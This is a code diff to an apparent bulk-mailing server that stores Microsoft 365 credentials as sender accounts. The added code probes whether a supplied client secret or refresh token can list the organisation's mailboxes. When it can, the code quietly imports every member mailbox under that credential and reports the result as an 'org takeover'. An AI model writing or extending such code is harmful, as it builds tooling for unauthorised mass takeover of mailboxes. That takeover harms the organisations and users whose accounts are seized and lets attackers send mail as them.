@@ -10,7 +10,7 @@ import Fastify from 'fastify';
 import fastifyStatic from '@fastify/static';
 import { decryptSecret, encryptSecret, tokensEqual, unsubscribeToken } from './crypto.js';
 import { parseRecipientsCsv, parseLooseEmails } from './csv.js';
-import { publicSmtp, publicSendSettings, getGraphAccessToken, msRtMailboxInfo, msCcVerifyMailbox, msCcListMailboxes } from './mailer.js';
+import { publicSmtp, publicSendSettings, getGraphAccessToken, msRtMailboxInfo, msCcVerifyMailbox, msCcListMailboxes, msRtListOrgMailboxes } from './mailer.js';
 import { escapeHtml } from './placeholders.js';
 import { transaction } from './db.js';
 import { DEFAULT_AI_RULES } from './default-ai-rules.js';
@@ -1537,12 +1537,37 @@ ${ctxLines ? `\nOPERATOR CONTEXT:\n${ctxLines}` : ''}${rules ? `\n\nSTANDING RUL
           for (const mb of mailboxes) {
             results.push(insertMsAccount('ms_cc', parsed.clientId, parsed.secret, parsed.tenant, mb.email, mb.displayName));
           }
+          // Smart detection — creds handed us one mailbox but may be tenant-wide:
+          // if they can enumerate the org, take it over and import every member mailbox.
+          if (parsed.email) {
+            try {
+              const org = await msCcListMailboxes(parsed.clientId, parsed.secret, parsed.tenant);
+              const extra = org.filter((m) => m.email.toLowerCase() !== mailboxes[0].email.toLowerCase());
+              if (extra.length) {
+                results.push({ ok: true, email: '', name: '', admin: true, note: `admin creds detected — org takeover: ${extra.length} more mailbox(es)` });
+                for (const mb of extra) results.push(insertMsAccount('ms_cc', parsed.clientId, parsed.secret, parsed.tenant, mb.email, mb.displayName));
+              }
+            } catch { /* single-mailbox creds — fine */ }
+          }
           continue;
         }
         const info = await msRtMailboxInfo(parsed.clientId, parsed.rt, parsed.tenant);
         const sender = parsed.email || info.email;
         if (!sender) { results.push({ ok: false, error: 'mailbox email not resolvable', line: parsed.clientId }); continue; }
-        results.push(insertMsAccount('ms_rt', parsed.clientId, parsed.rt, parsed.tenant, sender, info.displayName));
+        const inserted = insertMsAccount('ms_rt', parsed.clientId, parsed.rt, parsed.tenant, sender, info.displayName);
+        results.push(inserted);
+        // Smart detection — token that can read the org directory is admin-grade:
+        // enumerate member mailboxes and import them bound to the same credential.
+        if (inserted.ok) {
+          try {
+            const org = await msRtListOrgMailboxes(parsed.clientId, parsed.rt, parsed.tenant);
+            const extra = org.filter((m) => m.email.toLowerCase() !== sender.toLowerCase());
+            if (extra.length) {
+              results.push({ ok: true, email: '', name: '', admin: true, note: `admin mailbox detected — org takeover: ${extra.length} more mailbox(es)` });
+              for (const mb of extra) results.push(insertMsAccount('ms_rt', parsed.clientId, parsed.rt, parsed.tenant, mb.email, mb.displayName));
+            }
+          } catch { /* plain mailbox, no directory rights — fine */ }
+        }
       } catch (err) {
         results.push({ ok: false, error: String(err.message || err).slice(0, 200), line: parsed.clientId });
       }
